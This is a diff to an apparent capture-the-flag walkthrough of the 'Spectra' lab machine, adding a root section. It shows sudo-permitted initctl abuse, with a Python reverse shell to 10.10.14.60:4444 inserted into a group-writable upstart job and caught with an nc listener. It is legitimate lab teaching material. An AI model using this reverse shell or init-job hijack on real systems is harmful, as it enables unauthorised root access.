@@ -19,6 +19,8 @@
   - [`autologin.conf.orig`](#autologinconforig)
   - [Getting the User Flag](#getting-the-user-flag)
 - Root
+  - [`initctl`](#initctl)
+  - [Getting the Root Flag](#getting-the-root-flag)
 
 ## Walkthrough
 
@@ -271,3 +273,126 @@ As the name of the file suggests, it contains something that seems to be a user'
 ### Getting the User Flag
 
 ![user flag](images/8.png)
+
+### `initctl`
+
+Run `sudo -l` to list out commands that the user can execute as root with no password.
+
+```
+katie@spectra ~ $ sudo -l
+User katie may run the following commands on spectra:
+    (ALL) SETENV: NOPASSWD: /sbin/initctl
+katie@spectra ~ $
+```
+
+As `katie`, we are able to run `/sbin/initctl` as root without password.
+Since I am not that familiar with `initctl`, let's check the [manual page of `initctl`](https://linux.die.net/man/8/initctl).
+
+It links to the [init(8) manual page](https://linux.die.net/man/8/init), which tells us that there are jobs that are defined by files located in `/etc/init` directory. Furthermore, it also links to [init(5) manual page](https://linux.die.net/man/5/init) that tells us how to configure these files. For now, let's visit `/etc/init`.
+
+There are many `.conf` files in the directory. Some of which are owned by the group `developers`.
+
+```
+katie@spectra ~ $ cd /etc/init
+katie@spectra /etc/init $ ls -la
+total 768
+# -- snip --
+-rw-rw----  1 root developers   478 Jun 29  2020 test.conf
+-rw-rw----  1 root developers   478 Jun 29  2020 test1.conf
+-rw-rw----  1 root developers   478 Jun 29  2020 test10.conf
+-rw-rw----  1 root developers   478 Jun 29  2020 test2.conf
+-rw-rw----  1 root developers   478 Jun 29  2020 test3.conf
+-rw-rw----  1 root developers   478 Jun 29  2020 test4.conf
+-rw-rw----  1 root developers   478 Jun 29  2020 test5.conf
+-rw-rw----  1 root developers   478 Jun 29  2020 test6.conf
+-rw-rw----  1 root developers   478 Jun 29  2020 test7.conf
+-rw-rw----  1 root developers   478 Jun 29  2020 test8.conf
+-rw-rw----  1 root developers   478 Jun 29  2020 test9.conf
+# -- snip --
+```
+
+And the user `katie` belongs to the `developers` group, which means that we can edit the files owned by the group.
+
+```
+katie@spectra /etc/init $ id
+uid=20156(katie) gid=20157(katie) groups=20157(katie),20158(developers)
+```
+
+It seems that every file that we can edit contains the same job configuration.
+
+```
+katie@spectra /etc/init $ cat test.conf
+description "Test node.js server"
+author      "katie"
+
+start on filesystem or runlevel [2345]
+stop on shutdown
+
+script
+
+    export HOME="/srv"
+    echo $$ > /var/run/nodetest.pid
+    exec /usr/local/share/nodebrew/node/v8.9.4/bin/node /srv/nodetest.js
+
+end script
+
+pre-start script
+    echo "[`date`] Node Test Starting" >> /var/log/nodetest.log
+end script
+
+pre-stop script
+    rm /var/run/nodetest.pid
+    echo "[`date`] Node Test Stopping" >> /var/log/nodetest.log
+end script
+```
+
+### Getting the Root Flag
+
+According to the manual page init(5), the `script` block contains the shell script that will be run when we start the job.
+Therefore, to get access to the root shell, let's add the following script within the script block ([source](https://highon.coffee/blog/reverse-shell-cheat-sheet/#python-reverse-shell)).
+
+```
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.60",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+
+The Python reverse shell is used here since, for some reason, bash reverse shell does not work and I know that Python is running on the remote machine.
+
+This makes the final `script` block looks as follows
+
+```
+# -- snip --
+
+script
+
+    export HOME="/srv"
+    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.60",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+    echo $$ > /var/run/nodetest.pid
+    exec /usr/local/share/nodebrew/node/v8.9.4/bin/node /srv/nodetest.js
+
+end script
+
+# -- snip --
+```
+
+Also, don't forget to setup a listener on your local machine with `nc -nlvp 4444`.
+
+Based on initctl(8) manual page, we can start a job using the `start` command. To make sure that the job is not running before we start it (since starting a running job will return an error), we can use the `stop` command.
+
+```
+katie@spectra /etc/init $ sudo initctl stop test
+test stop/waiting
+katie@spectra /etc/init $ sudo initctl start test
+test start/running, process 55820
+```
+
+We should get the root shell in the `nc` listener that we setup earlier.
+
+```
+$ nc -nlvp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.60] from (UNKNOWN) [10.10.10.229] 43684
+# whoami
+root
+```
+
+![root flag](images/9.png)
